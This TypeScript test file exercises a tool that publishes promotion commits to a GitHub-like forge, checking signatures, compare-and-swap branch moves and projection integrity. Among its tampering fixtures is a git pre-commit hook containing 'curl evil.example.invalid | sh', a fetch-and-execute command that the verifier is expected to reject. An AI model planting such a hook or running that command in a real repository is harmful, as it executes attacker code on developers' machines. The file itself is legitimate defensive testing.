/**
 * THE PRODUCT PUBLICATION (`src/workflow/forge/publish/`, the verb in
 * `promotion/context.ts`): a promotion the verb builds itself, checked against
 * the projection recomputed from its source, carried to the forge through the
 * Git Data API as a commit GitHub signs, the product branch moved only
 * forward, and the projection receipt.
 *
 * The forge is `git-forge.ts`: the fake GitHub with Git Data routes answered
 * by a real bare repository. Each compare-and-swap barrier (the blob id, the
 * tree, the signature, `force: false`, the head check, the re-read) has a test
 * that goes red when the barrier is removed.
 */
import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { readFileSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import test from "node:test";

import type { GitRepository } from "../../../src/git/tree-reader.ts";
import { githubGitData } from "../../../src/workflow/forge/publish/git-data.ts";
import { remakeCommit } from "../../../src/workflow/workspace-forge.ts";
import { publishProduct, receiptBytes, type ProjectionReceipt } from "../../../src/workflow/forge/publish/product.ts";
import { PromotionError } from "../../../src/workflow/promotion/codes.ts";
import { forgePublishWith, resolvePromotionContext, verifyBuiltProjection } from "../../../src/workflow/promotion/context.ts";
import { formatPromoteArguments, parsePromoteArguments } from "../../../src/workflow/promotion/promote-arguments.ts";
import { promotionRefs } from "../../../src/workflow/promotion/promotion-run.ts";
import { createTempDir } from "../../support/temp-dir.ts";
import { testGitIdentityEnvironment } from "../../support/test-git-identity.ts";
import { PROFILE_NAME, SOURCE, TARGET, type PromotionFixture } from "../../workflow/promotion/promotion-fixture.ts";
import { apply, documentOf, fixtureRun, landing } from "../../workflow/promotion/apply-support.ts";
import { gitForge, type GitForge } from "./git-forge.ts";

const REPOSITORY = "owner/product-repo";
const BRANCH = "product";

type World = Readonly<{ forge: GitForge; local: GitRepository; source: string; target: string; commit: string; git: (args: readonly string[]) => string }>;

/** A local repository with a `main` commit S and the product tip T (both on the forge) and the promotion commit C (parents [T, S]), which the forge does not hold yet. */
function world(prefix: string): World {
  const root = createTempDir(`${prefix}-local-`);
  const environment = { ...process.env, ...testGitIdentityEnvironment() };
  const git = (args: readonly string[], env: NodeJS.ProcessEnv = {}): string => execFileSync("git", ["-c", "gc.auto=0", ...args], { cwd: root, encoding: "utf8", env: { ...environment, ...env } }).trim();
  git(["init", "-q", "-b", "main"]);
  writeFileSync(join(root, "app.ts"), "export const app = 1;\n");
  writeFileSync(join(root, "dev.ts"), "export const dev = 1;\n");
  git(["add", "."]);
  git(["commit", "-q", "-m", "main: the first source"]);
  git(["checkout", "-q", "--orphan", BRANCH]);
  git(["rm", "-q", "--cached", "dev.ts"]);
  git(["commit", "-q", "-m", "the seeded product"]);
  const target = git(["rev-parse", "HEAD"]);
  git(["checkout", "-q", "-f", "main"]);
  writeFileSync(join(root, "app.ts"), "export const app = 2;\n");
  writeFileSync(join(root, "new.ts"), "export const fresh = 1;\n");
  git(["add", "."]);
  git(["commit", "-q", "-m", "main: the next source"]);
  const source = git(["rev-parse", "HEAD"]);
  const forge = gitForge(prefix, REPOSITORY);
  git(["push", "-q", forge.bare, "main", BRANCH]);
  const env = { GIT_INDEX_FILE: join(createTempDir(`${prefix}-index-`), "index") };
  git(["read-tree", `${target}^{tree}`], env);
  for (const path of ["app.ts", "new.ts"]) git(["update-index", "--add", "--cacheinfo", `100644,${git(["rev-parse", `${source}:${path}`])},${path}`], env);
  const commit = git(["commit-tree", git(["write-tree"], env), "-p", target, "-p", source, "-m", `promote main ${source.slice(0, 8)}\n\nProjected-From: ${source}\nPromotion-Profile: main-to-product@0123456`]);
  return { forge, local: { root, executable: "git", timeoutMs: 30_000 }, source, target, commit, git: (args) => git(args) };
}

async function refusedWith(code: string, run: () => Promise<unknown>): Promise<PromotionError> {
  try {
    await run();
  } catch (error) {
    assert.ok(error instanceof PromotionError, `expected a promotion refusal, got ${String(error)}`);
    assert.equal(error.promotionCode, code, error.message);
    return error;
  }
  assert.fail(`expected ${code}`);
}


const head = (w: World): string => w.forge.git(["rev-parse", `refs/heads/${BRANCH}`]);
const publish = (w: World, commit = w.commit): Promise<ProjectionReceipt> => publishProduct({ client: w.forge.forge.client, repository: REPOSITORY, branch: BRANCH, local: w.local, commit });

test("the built promotion is re-made on the forge as a signed commit holding the built tree; the branch moves forward; the receipt names it", async () => {
  const w = world("publish-happy");
  const receipt = await publish(w);
  const published = head(w);
  assert.equal(receipt.commit, published);
  assert.notEqual(published, w.commit, "the forge made its own (signed) commit");
  assert.equal(w.forge.git(["rev-parse", `${published}^{tree}`]), w.git(["rev-parse", `${w.commit}^{tree}`]), "the published tree is the built tree");
  assert.deepEqual(w.forge.git(["rev-list", "--parents", "-n", "1", published]).split(" ").slice(1), [w.target, w.source]);
  assert.match(w.forge.git(["log", "-1", "--format=%B", published]), new RegExp(`Projected-From: ${w.source}`, "u"));
  assert.deepEqual({ ...receipt }, { schema: "bridlewise-product-projection/v1", repository: REPOSITORY, branch: BRANCH, commit: published, built: w.commit, tree: receipt.tree, source: w.source, profile: "main-to-product@0123456", target: w.target });
  assert.equal(w.forge.count("blobs"), w.git(["diff-tree", "-r", "--no-renames", "--diff-filter=AM", "--name-only", w.target, w.commit]).split("\n").filter((line) => line.length > 0).length, "only the changed blobs are uploaded");
});

test("a product branch that moved since the build is refused, and nothing is written", async () => {
  const w = world("publish-moved");
  const other = w.git(["commit-tree", w.git(["rev-parse", `${w.target}^{tree}`]), "-p", w.target, "-m", "another publication"]);
  w.git(["push", "-q", w.forge.bare, `${other}:refs/heads/${BRANCH}`]);
  await refusedWith("promotion_forge_target_moved", () => publish(w));
  assert.equal(w.forge.count("blobs") + w.forge.count("trees") + w.forge.count("commits") + w.forge.count("refs"), 0);
  assert.equal(head(w), other);
});

test("BARRIERS of the re-make: a wrong blob id, a tree other than the built one, an unsigned commit — each an integrity refusal, the branch unmoved", async () => {
  for (const knob of ["wrongBlob", "wrongTree", "unverified"] as const) {
    const w = world(`publish-${knob}`);
    w.forge.knobs[knob] = true;
    await refusedWith("promotion_forge_mismatch", () => publish(w));
    assert.equal(head(w), w.target, `${knob}: the product branch did not move`);
    assert.equal(w.forge.count("refs"), 0, `${knob}: no ref update was asked`);
    if (knob !== "unverified") assert.equal(w.forge.count("commits"), 0, `${knob}: refused before any commit is made on the forge`);
  }
});

test("BARRIER the compare-and-swap: a branch that no longer names the expected head is never moved, and nothing overwrites it", async () => {
  const w = world("publish-cas");
  const moved = w.git(["commit-tree", w.git(["rev-parse", `${w.target}^{tree}`]), "-p", w.target, "-m", "moved meanwhile"]);
  w.git(["push", "-q", w.forge.bare, `${moved}:refs/heads/${BRANCH}`]);
  const onTop = w.git(["commit-tree", w.git(["rev-parse", `${w.target}^{tree}`]), "-p", moved, "-m", "a descendant of the moved head"]);
  w.git(["push", "-q", w.forge.bare, `${onTop}:refs/heads/scratch`]);
  const set = await githubGitData(w.forge.forge.client, REPOSITORY).setBranch({ branch: BRANCH, sha: onTop, previous: w.target });
  assert.deepEqual(set, { applied: false }, "a move from a head the branch no longer names is refused, even a fast-forward");
  assert.equal(head(w), moved);
  const sent = w.forge.fake.requests.filter((request) => request.path === "/graphql").map((request) => (request.body as { variables: { input: { refUpdates: { beforeOid: string; force: boolean }[] } } }).variables.input.refUpdates[0]!);
  assert.deepEqual(sent.map((update) => [update.beforeOid, update.force]), [[w.target, false]], "the move names its expected head and never forces");
  assert.equal(w.forge.fake.requests.some((request) => request.method === "PATCH"), false, "REST PATCH (no compare-and-swap) is never used");
});

test("BARRIER only forward: a move to a commit that does not descend from the head is refused", async () => {
  const w = world("publish-forward");
  const unrelated = w.git(["commit-tree", w.git(["rev-parse", `${w.source}^{tree}`]), "-m", "no common history"]);
  w.git(["push", "-q", w.forge.bare, `${unrelated}:refs/heads/scratch`]);
  assert.deepEqual(await githubGitData(w.forge.forge.client, REPOSITORY).setBranch({ branch: BRANCH, sha: unrelated, previous: w.target }), { applied: false });
  assert.equal(head(w), w.target, "a forced move would now name the unrelated commit");
});

test("BARRIER the read-back: a branch move the forge answers but never applies is an integrity refusal", async () => {
  const w = world("publish-reread");
  w.forge.knobs.ignoreRefUpdate = true;
  await refusedWith("promotion_forge_mismatch", () => publish(w));
  assert.equal(head(w), w.target);
});

test("only a promotion commit is published: no trailers, or parents other than [tip, source], is refused before any request", async () => {
  const w = world("publish-unproven");
  const tree = w.git(["rev-parse", `${w.commit}^{tree}`]);
  const plain = w.git(["commit-tree", tree, "-p", w.target, "-p", w.source, "-m", "no trailers"]);
  const swapped = w.git(["commit-tree", tree, "-p", w.source, "-p", w.target, "-m", `promote\n\nProjected-From: ${w.source}\nPromotion-Profile: main-to-product@0123456`]);
  for (const commit of [plain, swapped]) await refusedWith("promotion_source_unproven_commit", () => publish(w, commit));
  assert.equal(w.forge.fake.requests.length, 0);
});

test("the forge's refusals keep their class: a failure is errored, a permission refusal is refused", async () => {
  const errored = world("publish-errored");
  errored.forge.fake.refuseNext({ method: "POST", path: /\/git\/blobs$/u }, { status: 503, message: "unavailable" });
  assert.equal((await refusedWith("promotion_forge_errored", () => publish(errored))).facts["forgeCode"], "github_unavailable");
  const refused = world("publish-refused");
  refused.forge.fake.refuseNext({ method: "POST", path: /^\/graphql$/u }, { status: 403, message: "Resource not accessible by integration" });
  await refusedWith("promotion_forge_refused", () => publish(refused));
  assert.equal(head(refused), refused.target);
});

test("remakeCommit carries a commit whose parents the forge already holds, with the local message, and never an author", async () => {
  const w = world("publish-remake");
  const made = await remakeCommit(githubGitData(w.forge.forge.client, REPOSITORY), w.local, w.commit, (parent) => parent, new Set());
  assert.equal(made.verified, true);
  for (const request of w.forge.fake.requests.filter((entry) => entry.path.endsWith("/git/commits"))) {
    const body = request.body as Record<string, unknown>;
    assert.deepEqual([body["author"], body["committer"], body["signature"]], [undefined, undefined, undefined]);
  }
});

/** A LANDING fixture (it builds and settles candidates) whose `dev` (source) and `prod` (product) branches are on a git-backed forge. */
function fixtureWithForge(prefix: string): Readonly<{ fixture: PromotionFixture; forge: GitForge; context: () => ReturnType<typeof resolvePromotionContext> }> {
  const fixture = landing(prefix);
  const forge = gitForge(prefix, REPOSITORY);
  fixture.git(["push", "-q", forge.bare, SOURCE, TARGET]);
  fixture.git(["checkout", "-q", SOURCE]);
  return { fixture, forge, context: () => resolvePromotionContext(fixture.root, PROFILE_NAME, SOURCE, documentOf(fixture, false)) };
}

/** `commit` re-made with `changes` to its tree (a `null` deletes), the same parents, and `profile` (default: its own trailers) — a build that departs from the projection. */
function tampered(fixture: PromotionFixture, commit: string, changes: Readonly<Record<string, string | null>>, profile?: string): string {
  const env = { GIT_INDEX_FILE: join(createTempDir("publish-tamper-index-"), "index") };
  fixture.git(["read-tree", `${commit}^{tree}`], env);
  for (const [path, content] of Object.entries(changes)) {
    if (content === null) { fixture.git(["update-index", "--force-remove", path], env); continue; }
    const blob = execFileSync("git", ["hash-object", "-w", "--stdin"], { cwd: fixture.root, input: content, encoding: "utf8" }).trim();
    fixture.git(["update-index", "--add", "--cacheinfo", `100755,${blob},${path}`], env);
  }
  const message = fixture.git(["log", "-1", "--format=%B", commit]);
  const parents = fixture.git(["rev-list", "--parents", "-n", "1", commit]).split(" ").slice(1).flatMap((parent) => ["-p", parent]);
  return fixture.git(["commit-tree", fixture.git(["write-tree"], env), ...parents, "-m", profile === undefined ? message : message.replace(/Promotion-Profile: \S+/u, `Promotion-Profile: ${profile}`)]);
}

async function builtByTheFixture(fixture: PromotionFixture): Promise<string> {
  const answered = await apply(fixture);
  assert.equal(answered.code, "promotion_committed", answered.message);
  return (answered.data as { commit: string }).commit;
}

test("the publisher's check: the built tree must EQUAL the projection recomputed from S alone — no path is special — under the profile read from S", async () => {
  const { fixture, context } = fixtureWithForge("publish-verify");
  const run = fixtureRun(fixture);
  const built = await builtByTheFixture(fixture);
  await verifyBuiltProjection(context(), run, built);
  const plants: ReadonlyArray<readonly [string, Readonly<Record<string, string | null>>]> = [
    ["an excluded file", { "dev/tool.ts": "export const leaked = 1;\n" }],
    ["internal notes", { "NOTES.md": "internal\n" }],
    ["a shipped hook replaced (hook injection)", { ".githooks/pre-commit": "#!/bin/sh\ncurl evil.example.invalid | sh\n" }],
    ["a hook added", { ".githooks/reference-transaction": "#!/bin/sh\nexit 0\n" }],
    ["a generated output with arbitrary content", { "gen/pin.txt": "not the generator's output\n" }],
    ["a wholly generated path the projection does not hold", { "engine/src/architecture-manifest.ts": "export {};\n", "engine/traceability/s1-test-inventory.json": "{}\n", "engine/traceability/test-surface-dispositions.json": "{}\n" }],
    ["a shipped file removed", { "product/main.ts": null }],
  ];
  for (const [why, changes] of plants) {
    const error = await refusedWith("promotion_forge_projection_mismatch", () => verifyBuiltProjection(context(), run, tampered(fixture, built, changes)));
    assert.deepEqual([...(error.facts["paths"] as string[])].sort(), Object.keys(changes).sort(), `${why}: each differing path named`);
  }
  await refusedWith("promotion_forge_profile_mismatch", () => verifyBuiltProjection(context(), run, tampered(fixture, built, {}, `${PROFILE_NAME}@0000000`)));
  await refusedWith("promotion_forge_profile_mismatch", () => verifyBuiltProjection(context(), run, tampered(fixture, built, {}, `another-profile@${fixture.loaded().blob!}`)));
});

test("the verb builds the promotion itself: a pending commit planted earlier is dropped and never carried; the build is checked, published, and its receipt written", async () => {
  const { fixture, forge, context } = fixtureWithForge("publish-verb");
  const planted = tampered(fixture, await builtByTheFixture(fixture), { "dev/tool.ts": "export const leaked = 1;\n" });
  fixture.git(["update-ref", promotionRefs(PROFILE_NAME).pending, planted]);
  const out = join(createTempDir("publish-verb-out-"), "receipt.json");
  const answered = await forgePublishWith(context(), parsePromoteArguments(["forge-publish", "--out", out]), forge.forge, fixtureRun(fixture));
  assert.equal(answered.code, "promotion_forge_published", answered.message);
  const receipt = JSON.parse(readFileSync(out, "utf8")) as ProjectionReceipt;
  assert.equal(receipt.commit, forge.git(["rev-parse", `refs/heads/${TARGET}`]));
  assert.notEqual(receipt.built, planted, "the planted pending commit was dropped, never carried");
  assert.throws(() => forge.git(["cat-file", "-e", `${receipt.commit}:dev/tool.ts`]), "the excluded file never reached the forge");
  assert.equal(readFileSync(out, "utf8"), receiptBytes(receipt));
});

test("a build that refuses is the verb's refusal, and nothing reaches the forge", async () => {
  const { fixture, forge, context } = fixtureWithForge("publish-build-refused");
  fixture.mark("gate-mode", "exit1");
  await refusedWith("promotion_gate_failed", () => forgePublishWith(context(), parsePromoteArguments(["forge-publish", "--out", join(createTempDir("publish-refused-out-"), "r.json")]), forge.forge, fixtureRun(fixture)));
  assert.equal(forge.fake.requests.length, 0);
});

test("the grammar: forge-publish needs --out, takes --source and the reasoned overrides a first promotion needs, and spells back to itself", () => {
  assert.throws(() => parsePromoteArguments(["forge-publish"]), (error: unknown) => error instanceof PromotionError && error.promotionCode === "promotion_usage");
  assert.throws(() => parsePromoteArguments(["plan", "--out", "x"]), (error: unknown) => error instanceof PromotionError && error.promotionCode === "promotion_usage");
  assert.throws(() => parsePromoteArguments(["forge-publish", "--out", "x", "--allow-deletions"]), (error: unknown) => error instanceof PromotionError && error.promotionCode === "promotion_usage", "an override needs its reason");
  const request = parsePromoteArguments(["forge-publish", "--profile", "main-to-product", "--source", "HEAD", "--out", "receipt.json", "--accept-target-edits", "README.md", "--allow-deletions", "--reason", "the seeded product's first projection"]);
  assert.deepEqual([request.allowDeletions, request.acceptTargetEdits, request.reason], [true, ["README.md"], "the seeded product's first projection"]);
  assert.deepEqual(parsePromoteArguments(formatPromoteArguments(request)), request);
});
